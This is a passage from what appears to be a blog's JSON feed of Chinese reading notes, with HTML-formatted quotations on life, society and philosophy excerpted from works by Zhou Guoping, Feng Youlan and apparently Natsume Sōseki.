耐到适应社会为止。除此之外没有其他路好走。</p>\n<p>人所进行的研究，都是在研究自身。无论是天地山川，还是日月星辰，无非是自己的别名。能够离开自己去研究的其他事项，是任何人也难以做到的。如果人能做到跳出自己的圈子，在跳出去的瞬间，人就已经不再是自己了。</p>\n<h3 id=\"4-37\"><a class=\"markdownIt-Anchor\" href=\"#4-37\">#</a> 4-37</h3>\n<p>因为一照镜子就可以妍蚩美丑分明。人们肯定会发觉，就凭这幅尊容怎么一直活到今天，还居然能在人前大言不惭地吹嘘自己竟然也是个人呢？当能够发觉这点的时候，是人的一生中最值得庆贺的事。天下的事再也没有比自己承认自己愚蠢更为可贵的了。</p>\n<p>从门外汉看来，好像是一种不可理解的癖好，而本人却认为这是理所当然的，这和教育家硬要把扭曲学生的本性，自吹 “请看我的本领” 如出一辙，因此也就毫无可以指责的理由了。</p>\n<p>说起来，天地之间弄不懂地东西多得很，不过你要给它加上某种意义，那么没有一件事是做不到的。不管多么艰深的文章，只要你想解释他，就可以不用太费力给予解释。</p>\n<p>学者把本来可以懂得东西，解释得使人听不懂。</p>\n<p>说不定，也许社会就是疯子的集合体，疯子聚在一起，互相争斗，互相仇视，互相谩骂，互相争夺，而他的整体作为一个集团，像细胞那样忽而散裂，忽而又膨胀强大起来，忽而膨大忽而又散裂开来，一天天这样继续下去。这可能就是所谓的社会吧。</p>\n<p>疯子在他是单个人的时候，会始终被人们当作疯子，但是成为一个团体，有了势力，说不定就成了健全人了。大疯子利用他的金钱力量和威力，指使那些小疯子互作非为，人们反而称赞大疯子是了不起的人物。</p>\n<p>很可能在其中有个多少懂点道理、明辨是非的人，反而会变得碍眼，于是才造了疯人院，把他圈到里边去让他再也无法出来的吧。这样看来，所谓幽闭在疯人院里的人倒是普通人，而在疯人院外边闹腾的人却是疯子。</p>\n<p>如果给人下定义，只要说专门干出一些自己不需要的事来给自己找烦恼的就是人。</p>\n<p>那些无能无才的小人，硬要出人头地，总想登上不相称的官职，这种心性，在是个孩子时就已经萌芽了。其由来既如此久而深，决不是教育，熏陶所能改正过来的。</p>\n<p>这些人的有所作为决不能说不是真的，只不过是一种流氓的本领罢了。</p>\n<h3 id=\"4-38\"><a class=\"markdownIt-Anchor\" href=\"#4-38\">#</a> 4-38</h3>\n<p>当我领教了一番现今社会上的那些有所作为，无非是有的扯谎骗人，有的为了坑人先下手为强，有的以虚张声势来恫吓人，有的搞阴谋诡计陷害他人，除此之外就什么作为也没有了。</p>\n<p>就连中学里的一些青少年们，也都和这些社会上的人亦步亦趋，误认为不这样就会吃不开，自鸣得意地干着本来应该感到羞愧的事，还以未来的绅士自居。</p>\n<p>学校培养这样的学生事学生的耻辱。国家由这样的人民构成是国家的耻辱。我真不明白为什么是耻辱，而社会上却充斥着这种东西。</p>\n<p>由于受到文明的坏影响，他们明明很想做某件事情，却往往不以正面开始走近路，而是采取从远处兜圈子的方法。很多人白白浪费了很多不必要的手段和劳力，并且错误地认为这才是正途，这才是绅士应该采取的方针。这些都是为文明开化这一恶果所束缚的畸形儿。</p>\n<p>假如人类的品性可以用围棋子儿推测的话，那么不能不说所谓人类，正像除了站立着的两条腿无论如何不肯向前迈步那样，还喜欢用小刀划定自己的地盘，缩小他们广阔的世界。所谓人类，是一种自讨苦吃的动物。</p>\n<p>我想这就是我灵魂寄托所在。我觉得我就像是一位武士在漫漫长夜的灯影之前，将磨得锋利的宝剑从剑鞘里猛得抽出时那样，有一种说不出的感情。</p>\n<p>睡梦中想的是我，醒来想的还是我，这个我到处不离身，结果人的言行只能是小里小气，只能把自己束缚的紧紧的，只能感觉人世是痛苦的。现今的人，总在盘算怎样对自己有利，怎样对自己不利，自觉心和窃贼一样强烈。</p>\n<p>在二十四小时中总是心神不宁，总在偷偷摸摸地行动，在走向坟墓之前一刻也不得安宁，这就是现代人的心态。</p>\n<p>以往的人教人们忘掉自己，现在的人教人不要忘了自己，这完全不同。二十四小时中充满了自我意识。正因为如此，二十四小时中没有一刻是太平的。永远处在焦热的地狱里。说到普天下什么是良药，再没有比忘掉自己更好的药了。</p>\n<p>昨天是昨天，今天是今天，从不改变自己的说法，是你头脑不发达的证据。</p>\n<h3 id=\"4-39\"><a class=\"markdownIt-Anchor\" href=\"#4-39\">#</a> 4-39</h3>\n<p>他的女儿嘛？我没看见过，不太好说，大概是死在穿上、吃上、或者醉生梦死之类吧，反正总不至于死在恋爱上面。</p>\n<p>文明若是按这种趋势发展戏曲，我简直都不愿意活了。</p>\n<p>一般人不够聪明，总是听其自然，置之不管，这样一来而去的结果就是被社会捉弄死了。但是有一种特殊的人，他不满足被社会这样零割碎卖地捉弄死。他非要考虑怎样死不可，经过种种研究的结果，必定会想出一个崭新的妙招，所以，今后世界上的自杀者将越来越多。</p>\n<p>和过去不同，现在是开明的时代，所以不可用刀枪或飞镖之类的东西，只需用折磨这种高尚的技术把他捉弄死，这对他本人也有好处。</p>\n<p>不能透彻识别真理的人，很容易被眼前的各种现象束缚住，动不动就像泡沫一般的梦幻当成永久的真实，所以如果有人稍微讲点离奇的话，立刻就会被当成笑话。</p>\n<p>人只是受眼前习惯的摆布，就会忘掉根本原理。</p>\n<p>总想尽量扩充自己，将自己膨胀到几乎炸裂的程度，使自己在无限痛苦中生存着。由于太痛苦，所以用各种方法寻找个人与个人之间的余裕。这样的人苦于自作自受，在百般痛苦中小心的生活着。</p>\n<p>这些近视者所能看到的，实在浅薄的可怜。</p>\n<p>那种囿于陋习，勉勉强强来实行结婚，是违反人类自然倾向的一种歪风，在个性不发达的矇昧时代，故作别论，在文明发达的今天，仍然陷入这种弊端，竟然不以为怪，这是极大的谬见。</p>\n<p>我之所以受这样的煎熬，无非是想要从缸里爬出去，但我又明白自己爬不出去了。既然明知逃不出，还想要逃出去，这显然是硬要做办不到的事儿。由于硬要做这种办不到的事，所以颇受痛苦。</p>\n<p>管它在哪里，管它是怎么回事，都没关系。我只觉得很舒服。不连舒服也感觉不到了。即便天地化为齑粉也罢，反正我已经进入奇妙、宁静的世界之中。</p>\n",
            "tags": [
                "社会",
                "人生哲学",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/39%E3%80%8A%E7%BB%8F%E5%85%B8%E7%9A%84%E7%90%86%E7%94%B1%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/39%E3%80%8A%E7%BB%8F%E5%85%B8%E7%9A%84%E7%90%86%E7%94%B1%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/",
            "title": "《经典的理由》周国平",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>天下小市民一样庸俗，天才一样受磨难，这是世界性的。</p>\n<h3 id=\"3-124\"><a class=\"markdownIt-Anchor\" href=\"#3-124\">#</a> 3-124</h3>\n<p>我不以为然，心想我反正不能一辈子生活在与人生无关的某个专业小角落里。</p>\n<p>后来，我不再以知识为最高目标，而是更加珍视生活本身，珍视人生的体悟。</p>\n<p>人生一切美好的东西不会因其短暂性而失去价值。</p>\n<h3 id=\"3-125\"><a class=\"markdownIt-Anchor\" href=\"#3-125\">#</a> 3-125</h3>\n<p>科学离开爱的目标，便只会使人盲目追求物质财富的增殖。在现代世界中，爱的最危险的敌人是工作即美德的信念，急于在工作和财产上取得成功的贪欲。</p>\n<p>人生在世的方式有千百种而每个人只能选择一种，说到底谁的生活都是狭窄的。尤当嗜书不是一种洁癖，做爱书家不是淡泊中的一种执著，退避中的一种追求呢？</p>\n<p>由于寂寞，现实中缺少或远离友人，所以把书当友人，从书中找安慰。也由于寂寞，没有纷繁人事的搅扰，所以能沉醉书中，获得澄明的享受。只有到了人生的逆境，被剥夺了靠交往和行动排遣寂寞的机会，怀着一种靠交往和行动排遣不了的寂寞，他才用书来排遣这无可排遣的寂寞。</p>\n<p>读” 有用的书 “即教科书和专业书固然有其用途，可以获得立足于社会的职业技能，但是读无用的书也并非真的无用，那恰恰是一个人精神生长的领域。</p>\n<p>三日不读书，便觉语言乏味，面目可憎。</p>\n<p>过去，教育的目标是为职业作准备，现在，教育应该为人们能够有意义的利用闲暇时间作准备。也就是说，应该使人们有能力在闲暇时间过一种有头脑的生活，而不是无所用心的生活。</p>\n<p>如果在做一些事情时不感到愉快，我们就必须怀疑是否有利益的强制在其中起着作用，使他们由性情生活蜕变成了功利行为。</p>\n<p>那些躁动不安，事事都想发表议论的人，那些渴慕荣利的人，一心以求解的本领和真理在握的姿态夸耀于人，哪里肯甘心于自个儿会意的境界。</p>\n<p>如果一种教育使学生不能体会和享受读书的乐趣，反而视读书为完全的苦事，我们便可以有把握判断它是失败了。</p>\n<p>我们只能用心去领悟，而不能凭借抽象的概括加以了解。</p>\n<h3 id=\"3-126\"><a class=\"markdownIt-Anchor\" href=\"#3-126\">#</a> 3-126</h3>\n<p>人生的实质很轻很轻，像影子一样没有分量，使人不能承受。</p>\n<p>面对人生的重大抉择，芸芸众生不过是被环境、欲念、利益等等一时的利益推着走，唯有少数人怀着贝多芬式” 非如此不可 “的决心，从一种坚定的信念出发作出决断。</p>\n<p>只活一次等于一次也没活。既然生命属于我们只有一次，我们就无法通过比较来检验人生的选择孰好孰坏。对于我们来说，生活是一场永远不能成为正式演出的彩排，一张永远不能成为正是作品的草图。</p>\n<p>轻松只是假象，背后掩藏着人生的轻飘虚幻，凡夫俗子感觉不到这一点，托马斯感觉到了。这种感觉败坏了人生中每一个美妙的瞬间，使他们丧失了全部意义。</p>\n<p>人生的抉择往往比我们折磨的要死要活，倘若我们想到所有这些抉择都将随我们的生命一同永远消逝，不留下任何痕迹，就会觉得不值得如此认真对待他们了。</p>\n<p>在人生中，决定每个人生命意义的特殊事件，它们由一连串偶然的机会凑成的。不但作为归宿的虚无，而且作为过程的偶然，都表明了人生实质之轻，轻得令人不能承受。</p>\n<p>媚俗就是迎合公共的趣味，煞有介事的把某种公认的价值奉为人生寄托。像萨宾娜这样及其敏感的心灵往往有一种洁癖和自由癖，不能忍受任何公共化的东西，视一般人心目中的精神寄托为精神枷锁。</p>\n<p>形式道德是要吃人的，它导致了无限镇压原则。它对心理的威慑力量甚至使无辜的受害者自觉有罪。</p>\n<p>人处在历史中，所以不可能把握作为整体的历史。因此，任何历史举动都是冒险，无数为任何绝对立场辩护。绝对的理性主义就如同绝对的虚无主义一样，也会把人类引向荒漠。</p>\n<h3 id=\"3-127\"><a class=\"markdownIt-Anchor\" href=\"#3-127\">#</a> 3-127</h3>\n<p>通过小王子的眼睛来看成人世界，发现大人们全在无事空忙，为占有、权力、虚荣、学问之类莫名其妙的活着。是的，大人们不知道自己想要什么。</p>\n<p>只有孩子们知道他们在寻找些什么，他们会为了一个破布娃娃而不惜让时光流逝，于是那布娃娃就变得十分重要，一旦有人把他们拿走，他们就哭了。</p>\n<p>一个人在衡量任何事物时，着重的是他们在自己生活中的意义，而不是他们能给自己带来多少实际利益，这样一种生活态度就是真性情。</p>\n<p>一个人如果在有生之年就努力把自己淡然于肉体的快乐，专注于灵魂的生活，他的灵魂就会适合于启程前往另一个世界，这是真正意义上的哲学活动。</p>\n<p>哲人之为哲人，倒也不在于相信灵魂不死，而不在于不管灵魂是否不死，都依然把灵魂生活当做人生中唯一永恒的价值看待，据此来确定自己的生活方式，从而对过眼云烟的尘世生活持一种超脱的态度。</p>\n<p>凡是死到临头仍然看不破尘世利益而为遗产、葬礼之类操心的人，其实都和严监生一样的可笑，区别只在于他们看到的灯草也许不只两茎，因而放心不下的是更多的灯油罢了。</p>\n<p>政治如此黑暗，善良的人的唯一正路是远离政治，做一个地道的农民。</p>\n<p>财富再多，他所能享受的也只是自己能够使用的部分，而这个部分是非常有限的，其余多出的部分对于他没有任何实际价值。由此他意识到，世人的贪婪乃是出于虚荣，而非出于真实的需要。</p>\n<p>他把诽谤的根源归结为懒惰和嫉妒，因为懒惰而自己不能优秀，因为嫉妒而怕别人优秀，这是多么准确。</p>\n<p>梦想要对生活告一个假，能够活着，同时却又在生活之外。</p>\n<p>我们最豪迈光荣的事业乃是生活得写意，其余一切，包括从政、发财，经营产业，充其量只是这一事业的点缀和附庸罢了。</p>\n<p>人有两种活动，一是生命的自我娱乐和自我享受，一是消耗生命以谋求外在的利益。一个人若因客观的逼迫或主观的欲念而过于操劳操心于后一种活动，前一种活动就必然被压抑，久而久之，性灵终于磨灭了。</p>\n<h3 id=\"3-128\"><a class=\"markdownIt-Anchor\" href=\"#3-128\">#</a> 3-128</h3>\n<p>不管社会风气如何堕落，官场如何腐败，一个人只要看重和彻悟生命的真正意义之所在，就决不会随波逐流。</p>\n<p>倘若科学成为功利，民主成为教条，他同样会感到智慧受辱，并起而反对。一个精神上真正自由的人当然是没有必要用一些手段掩饰自己或讨好别人的。</p>\n<p>哲学的本能驱策他追思那些永远解决不了的深邃的问题，结果使他在现实世界中成了一个迷茫的游荡者。</p>\n<p>仿佛陷入了生活的令人厌倦的重复之中，但同时又保持着一种清醒，始终意识到这种生活的平庸无聊。</p>\n<p>这种无聊表现为一种聚精会神的心不在焉，一种有所追求的无所事事，如同一个幽灵游荡在一个不属于他的世界上。</p>\n<p>在这个世界上，一切尘世的辛劳都已经消逝，一切超验的追问也都已经平息。现在他只是和周围的那些树一样，回到了单纯的生命。他不再言说但也不是沉默，他的语言和沉默都汇入了树叶的簌簌声。</p>\n<p>严格地说，世界上没有绝对健康的人，而这意味着人人在一定意义上都是残疾，区别只在明显或不明显。相比之下，我们这些身体表面没有残疾的人却很容易沉湎在繁忙的外部活动中，使得内在生命因为被忽略而日益趋于麻痹，这是比身体残废更加可悲的心灵瘫痪。</p>\n<p>在我们的时代，一种不关心人的精神苦闷和寻求的哲学是不会有生命力的。</p>\n<p>一些人糊里糊涂的受影响，另一些人糊里糊涂的去批判，真是一笔糊涂账。</p>\n<p>事实上，人生的一切重大问题都是说不清的，或者说，都可以有非常不同的说法。正因为如此，说起来才有意思。那些只有一种说法的事情，我们实在没有去说他的必要。</p>\n<h3 id=\"4-1\"><a class=\"markdownIt-Anchor\" href=\"#4-1\">#</a> 4-1</h3>\n<p>亚里士多德把善分为两大类，一类是因其自身而被追求的善，它是自足的，他称之为最高的善，另一类则是因为自身之外的原因被追求的善，那是比较低级的。</p>\n<p>最高的善或者是人的精神的自我实现和享受，或者体现了人的精神的尊严和高贵，均能使人真正感受到活着的意义。与之相比，伦理上的价值只是从属的善，它们的作用不是提供生活的意义，而是维护社会的秩序，给人类的生存和发展提供合适的社会环境。</p>\n<p>如果说精神性价值的实现方式是个人的精神生活，那么，社会性价值的实现方式便是一定人群的认同和维护，舍此它就是空的。</p>\n<p>规范不是别的，无非是实践中的价值原则罢了。它不是人为规定的一些条文，而是在实践中自发形成的。在一定人群的实践中，它表现为习俗和风俗。在一定时代的实践中，它表现为时尚。在一定宗教团体的实践中，它表现为戒律。在个人实践中，它表现为某种内在的约束。</p>\n<p>正是由于规范形成的自发性，不管他起的作用是好是坏，我们都不可能人为的把它废掉。只要人类社会存在一天，因而人类或人类中一定人群有一定的社会性价值需要维护，就必定会有相应的规范和存在。</p>\n<p>规范主义的特点在于把规范本身奉为绝对价值，而追问他的价值根据。</p>\n<p>一、把作为规范的工具性价值视为目的本身和最高的善，维护损害那些目的性价值的工具性价值及其规范。例如，以平等的名义鼓励平庸和压制优秀，以同等的名义败坏苦难的精神价值。</p>\n<p>二、在价值观念也已发生变化的情形下，维护一种陈旧的，而且确实起着坏作用的习俗，或者相反，无原则地追随任何一种时尚，不论它是否有合理的价值依据。</p>\n<p>三、把仅被某一人群认可的价值及其规范提升为普遍性规范，强加于整个社会。</p>\n<p>四、不是以人们所认可的价值为根据，而是出于政治和意识形状的需要或出于少数人的私利，人为地制定和推行某种纪律或律令，把它们冒充为规范。</p>\n<h3 id=\"4-2\"><a class=\"markdownIt-Anchor\" href=\"#4-2\">#</a> 4-2</h3>\n<p>法律只能禁止和制裁那些直接威海社会秩序的行为，不管我们用什么样的尺度来衡量危害的程度和确定危害的界限，始终存在着界限之外的情形，那是法律无能为力的空间，那里便是规范发生作用的余地。</p>\n<p>自古以来，辩论就有两种类型，一种是以追求真理为目的的辩论，一种是以锻炼和显示辩论术为目的地辩论。</p>\n<p>笼统地区分，可以把 “真理” 分为两类，一类是 “超验” 的真理，既不能证实，也不能证伪，只能归之于信仰。一类是 “经验” 的真理，但受经验和视角的限制，以及进行推理的逻辑工具和语言工具并不完善，也不可能完善。</p>\n<p>虽然通向真理的道路扑朔迷离，但寻求真理的热忱却永远是可贵的。</p>\n<p>人生要做的事太多，我没理由为这样无聊的事，浪费宝贵的精力。</p>\n<p>他在这里向世界发出过绝望的呼喊，但无人应答，正是这无边的沉默和永久的孤独把他逼疯了。</p>\n<p>追求起来，一切重要争论都源于价值观的分歧，双方所维护的都是某一种不容忽视的正面问题。在多数情况下，往往一方要维护某种理想主义价值，另一方要维护某种比较可行的实用行价值。也有时候，双方所维护的是不同的理想价值。透彻的说，价值无争论，只有选择。</p>\n<p>一种回避生命的悲剧性质的智慧无权称之为智慧，只配称作生活的精明。</p>\n<p>智慧使人对苦难更清醒也更敏感。一个智者往往对常人所不知的苦难也睁开着眼睛，又比常人更深地体悟到日常苦难背后的深邃的悲剧含义。在这个意义上，智慧使人痛苦。</p>\n<p>然而，由于智人有着比常人开阔得多的视野，进入他视界的苦难固然因此增多了，每一个单独的苦难所占据的位置却也相对减少了。常人容易被当下的苦难一叶障目，智者却能够恰当估计它与整个人生的关系。即使他是一个悲观主义者，由苦难的表象洞察人生悲剧的底蕴，但这种洞察也使他相对看轻了表象的重要性。</p>\n<p>智慧在使人感知痛苦的时候，也使人超脱痛苦。</p>\n<h3 id=\"4-3\"><a class=\"markdownIt-Anchor\" href=\"#4-3\">#</a> 4-3</h3>\n<p>最可悲的是整个民族对美和丑麻木不仁，置身于这样民族的个别爱美的灵魂岂能不被绝望所折磨？也许，美永远只属于少数人，时代永远属于公众，在任何时代，多数人总是讲究实际的。</p>\n<p>真正有独特个性的人并不竭力显示自己的独特，他不怕自己显得与旁人一样。那些时时处处想显示自己与众不同的人，往往是一些虚荣心十足的平庸之辈。</p>\n<p>质朴最不容易受骗，连成功也骗不了他。</p>\n<p>如果你太关注自己活的样子，总是活给别人看，或者是哪怕活给自己看，那么你愈是表演地真诚、独特、潇洒，你是加上活得却愈是做作、平庸、拘谨。</p>\n<p>在批评一个无能的政府时，聪明的政客至多能讽刺，老百姓却很善于幽默。因为前者觊觎权力，后者则完全置身于权力斗争之外。</p>\n<p>超脱的态度，能够俯视人间的一切是非包括自己的弱点。嘲讽却是较着劲的，很在乎自己的对和别人的错。</p>\n<p>爱智慧地人往往会情不自禁的欣赏敌手的聪明的议论，即使听到骂自己的俏皮话也会宽怀一笑。我忍受不了相反类型的人，他们在争论中只看见意见，只想到面子，对智慧的东西毫无反应。</p>\n<p>真正打动人的感情总是朴实无华的，它不出声、不张扬、埋得很深。沉默有一种特别的力量，当一切喧嚣静息下来后，他仍然在工作着，穿透可见或不可见的间隔，直达人心的最深处。</p>\n<p>我害怕说平庸的话，这种心理使我缄口。当我被迫说话时，我说出的往往是平庸的话。唯有在我自己感到非说不可的时候，我才能说出有价值的话。</p>\n<p>越是严肃的思想，深沉的情感，就越是难于诉诸语言。</p>\n<p>老是听别人发表同样的见解和感叹，我会感到乏味。不过我知道，在别人眼里也许我更乏味，他们在我这里甚至连见解和感叹也找不到，我不愿重复，又拿不出新的，于是只把沉默给他们。</p>\n<h3 id=\"4-4\"><a class=\"markdownIt-Anchor\" href=\"#4-4\">#</a> 4-4</h3>\n<p>我从来觉得，根本问题是不可讨论的，枝节问题又是不必讨论的。</p>\n<p>人们争论的问题只有两种，一种是用不着争的，一种是争不清楚的。</p>\n<p>真理很可能在两极之中的一个点上。但是，要找到这个点是不容易的事，许多时候，我们自以为找到了这个点的人那里听到的往往只是一些只能属于辩证的空话。</p>\n<p>所谓 “天才教育” 的结果多半不是把一个普通资质的人培养成了天才，而是把他扭曲成了一个高不成、低不就的畸形。教育不可能制造天才，却可能扼杀天才。而一切教育都可以归结为自我教育。</p>\n<p>文明进入意识层次，只是学问；而进入无意识层次，才是教养。</p>\n<p>在这世界上，谁真正严肃地生活着？难道是那些从不反省人生的浅薄之辈，哪怕他们像钟表一样循规蹈矩，像石像一样不苟言笑，哪怕他们是良民、忠臣、孝子、好丈夫，好父亲？在我看来，对自己的生命不负责任，就无严肃可言，平庸就是最大的不严肃。</p>\n<p>在医生眼里，人人都有病。在道德家眼里，人人都有罪。医生怜悯人类，道德家仇恨人类。怜悯人类的人自己有病，仇恨人类的人自己有罪。</p>\n<p>有的人生活在时间里，与古今哲人贤士相晤谈。有的人生活在空间里，与周围邻人俗世相往还。</p>\n<p>世界本无定相，对于不同的人呈现不同的面貌。</p>\n<p>世上可做可不做的事是做不完的，永远要去做那些值得做的事。</p>\n<p>一个人受另一个人的 “影响” 是什么意思呢？无非是一种自我发现，是自己本已存在但沉睡着的东西被唤醒。对心灵所发生的重大影响绝不可能是一种灌输，而应是一种共鸣和抗争。</p>\n<p>第三种人完全缺乏常识，全然受思想的支配，或者全然受教条的支配。从常人的眼光看来，他们是病人，前者是疯子，后者是呆子。</p>\n<p>思想停止了，才有思想。一切思想都是回忆。</p>\n<p>对于那些粗糙的耳朵来说，谎言重复十遍就变成了真理；对于那些精致的耳朵来说，真理重复十遍就变成了谎言。一个真理在人云亦云的过程中被抹去了个性，从而丧失了原初的真实性。精致的耳朵是宁愿听到有个性的谎言，而不愿听到无个性的真理的。</p>\n<h3 id=\"4-5\"><a class=\"markdownIt-Anchor\" href=\"#4-5\">#</a> 4-5</h3>\n<p>一件耗费了我们毕生光阴的事情未必就是有益于我们人生的事情，所以我们似乎有必要从人生的角度来为自己的付出寻找理由。</p>\n<p>任何有价值的东西一旦称为时髦，就必然贬值。</p>\n<p>中国人包括中国的学人历来看重事功，即使关心道德修养也有强烈的实用目的，而缺少对个人灵魂生活的关注。这个缺点被忽视了，而忽视本身更证明了这个缺点的存在。这个缺点便是把真理仅仅当做了工具，对于任何精神事物唯求其功用而忽视其本身的价值。</p>\n<p>我们多肤浅的全面，少深刻的片面，多平庸的健康，少天才的病态。我们的神经太平衡了，不过是一种弱平衡。</p>\n<p>我们没有无家可归的孤独感，被抛入世界的荒诞感，与虚无不期而遇的焦虑感，肩负毁灭的悲剧感。</p>\n<p>天下小市民一样庸俗，天才一样受磨难，这是世界性的。</p>\n<p>人类基本的真理始终是相同的，变化的只是对他们的表达以及那些次要的真理。</p>\n",
            "tags": [
                "意义",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/46%E3%80%8A%E4%B8%AD%E5%9B%BD%E5%93%B2%E5%AD%A6%E7%AE%80%E5%8F%B2%E3%80%8B%E5%86%AF%E5%8F%8B%E5%85%B0/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/46%E3%80%8A%E4%B8%AD%E5%9B%BD%E5%93%B2%E5%AD%A6%E7%AE%80%E5%8F%B2%E3%80%8B%E5%86%AF%E5%8F%8B%E5%85%B0/",
            "title": "《中国哲学简史》冯友兰",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>人必须先说很多话，然后保持静默。</p>\n<h3 id=\"4-50\"><a class=\"markdownIt-Anchor\" href=\"#4-50\">#</a> 4-50</h3>\n<p>宗教也和人生有关系。每种大宗教的核心都有一种哲学。事实上，每种大宗教就是一种哲学加上一定的上层建筑，包括迷信、教条、仪式和组织。这就是我所说的宗教。</p>\n<p>哲学，尤其是形上学，若是给予实际的信息，就会变成废话。</p>\n<p>如果除了宗教，别无获得更高价值的途径，的确应当惋惜它们。放弃了宗教的人，若没有代替宗教的东西，也就丧失了更高的价值。他们只好把自己限于尘世事务，而与精神事务绝缘。</p>\n<p>欲得到最高的成就，必须脱离尘罗世网，必须脱离社会，甚至脱离 “生”。只有这样，才可以得到最后的解脱。这就是 “出世的哲学”。</p>\n<p>儒家认为，处理日常的人伦世务，不是圣人分外的事。处理事物，正是他的人格完全发展的实质所在。他不仅作为社会的公民，而且作为 “宇宙的公民”，即孟子所说的天民，来执行这个任务。</p>\n<p>他要做的事就是修养自己，连续的，一贯的保持无私无我的纯粹经验，使他能够与宇宙合一。显然这个修养过程不能中断，因为一中断就意味着自我复萌，丧失他的宇宙。因此在认识上他永远摸索着，在实践上永远行动着，或尝试着行动。</p>\n<h3 id=\"4-51\"><a class=\"markdownIt-Anchor\" href=\"#4-51\">#</a> 4-51</h3>\n<p>他像苏格拉底，他的哲学不是用于打官腔的。他更不是尘封的陈腐的哲学家，关在书房，坐在靠椅上，处于人生之外。对于他，哲学从来就不只是为人类知识，摆设的观念模式，而是内在于他的行动的谏言体系。</p>\n<p>拿诗来说，诗人想要传达的往往不是诗中直接说了的，而是诗中没说的。</p>\n<p>在自然界和人类社会的任何事物，发展到一个极端，就反向另一个极端；这就是说，借用黑格尔的说法，一切事物都包含着他自己的否定。</p>\n<p>“农” 的生活方式是顺乎自然的。他们赞美自然，谴责人为，于其纯朴天真之中，很容易满足。他们不想变化，也无从想象变化。中国曾经有不少著名的创造发明，但是我们常常看到，它们不是受到鼓励，而是受到了阻挠。</p>\n<p>理想的人生是这样一种人生，虽然对宇宙有极高明的见解，却仍然置身于人类的五种基本关系的界限之内。这些人伦的性质可以根据环境而变。但是这种理想本身并不变。</p>\n<p>还有些人， 很有学问和天才，但是深受当时政治动乱之苦，就退出人类社会，躲进自然天地，他们被称为 “隐者”。</p>\n<p>不论在哪个方面、决定行为的 “契据” 都在本人自身，而不在其他东西之中。</p>\n<p>一个人做他应该做的事，纯粹是由于这样做在道德上是对的，而不是出于这种道德强制以外的任何考虑。</p>\n<p>依儒家看来，一个人不可能无为，因为每个人都有他应该做的事。然而他做这些事都是 “无所为 “，因为做这些事的价值在于做的本身之内，而不是在于外在的结果之内。</p>\n<p>虽然他的一切努力都是枉费，可是他从不气馁。他明知道他不会成功，仍然继续努力。</p>\n<p>我们的活动，要取得外在的成功，总是需要这些条件的配合。但是这种配合，整个的看来，却在我们能控制的范围之外。所以我们能够做的，莫过于一心一意尽力去做我们知道是我们应该做的事。而不计成败，这样做，就是” 知命 “。</p>\n<h3 id=\"4-52\"><a class=\"markdownIt-Anchor\" href=\"#4-52\">#</a> 4-52</h3>\n<p>知命也就是承认世界本来存在的必然性，这样，对于外在的成就也就无所萦怀。如果我们做到这一点，在某种意义上，我们也就永不失败。</p>\n<p>在儒家看来，命是指人们所能控制的范围以外的东西。但是，他若是竭尽全力，总还有一些东西是他力所能及的控制范围以内的。所以，人只有已经做了他自己能够做的一切之后，对于那些仍然要来到的东西才只好认为是不可避免的，只好平静地、无可奈何的接受他。</p>\n<p>爱别人就是一种个人保险或投资，它是会得到偿还的。可是绝大多数的人都很近视，看不出这种长期投资的价值。也还有一些实例，说明这样的投资根本得不到偿还。</p>\n<p>人们接受这样的权威，并不是因为它选中了他，而是由于它们无可选择。</p>\n<p>一国之内，只能有一义存在，这一义必须是国家自身确定的一义。别的义都是不能容忍，因为如果存在别的义，人们很快就会返回到 “自然状态”，除了天下大乱，一无所有。</p>\n<p>无用是全生的方法。善于全生的人，一定不能多为恶，但是也一定不能多为善。他一定要生活在善恶之间。他力求无用，但是到头来，无用对他来说有大用。</p>\n<p>普通隐者的方法，他们逃离人世，遁迹山林、心想这样就可以避开人世的恶。可是人世间的事多么复杂，不论你隐藏的多么好，总是有些恶、仍然无法避开。</p>\n<p>事物变，但是事物变化的规律不变。一个人如果懂得了这些规律，并且遵循这些规律以调整自己的行动，他就能使事物转向对他有利。</p>\n<p>从一个更高的观点、看生死、看物我，从这个更高的观点看事物，就能够超越现实的世界。这也是 “避” 的一种形式；然而不是从社会到山林，而很像是从这个世界到另一个世界。</p>\n<p>每个人应当毫不考虑自己的利益，无条件的做他应该做的事，成为她应该成为的人。</p>\n<h3 id=\"4-53\"><a class=\"markdownIt-Anchor\" href=\"#4-53\">#</a> 4-53</h3>\n<p>人之所以异于禽兽，在于有人伦以及建立在人伦之上的道德原则。国家和社会起源于人伦。照墨家说，国家的存在是因为他有用；照儒家说，国家的存在是因为他应当存在。</p>\n<p>君若没有圣君必备的道德条件，人民在道德上就有了革命的权利。在这种情况下，即使杀了君，也不算弑君之罪。这是因为，照孟子说，君若不照理想的君道应当做的事，他在道德上就不是君了。</p>\n<p>天爵都是在价值世界里才能够达到的境地，至于人爵都是人类世界里纯属世俗的概念。一个天民，正因为他是天民，所关心的只是天爵，而不是人爵。</p>\n<p>通过行衷恕，他的自我、自私都逐步减少了。一旦减无可减，他就感觉到再也没有人与我的分别，再也没有人与天的分别。这就是说，他已经与天，即与宇宙统一，成为一个整体。</p>\n<p>人性的情况也一样，圣人的本性与其他人的也相同。所以每个人都能够成为圣人，只要他充分发展他地本性就好了。</p>\n<p>名家怪谈，与别人争辩时，否定他们的肯定，肯定他们的否定。</p>\n<p>它们对于实、都无所肯定，因为他们对于实际世界中什么东西最大，什么东西最小，都无所肯定。它们只涉及抽象的概念，就是名：“至大”“至少”。</p>\n<p>“日方中方睨，物方生方死 “。实际世界中的一世事务都是可变的，都是可变的。</p>\n<p>万物彼此相同，又可以说万物彼此相异，它们的同和异是相对的。</p>\n<p>万物是相对的，不断变化的。万物之间没有绝对的不同，绝对的界限。所以得出逻辑的结论：万物一体，因而应当泛爱万物，不加区别。</p>\n<p>经验的对象总是站在经验者的对面。如果说，“一切” 能够是经验的对象，那就一定也要说，还有个经验者站在 “一切” 的对面。换句话说，一定要说 “一切” 无外而同时有外，这是个明显的矛盾。</p>\n<p>绝大多数人的思想都限于 “形象之内”，即限于实际世界。他们见到了实际，要都限于 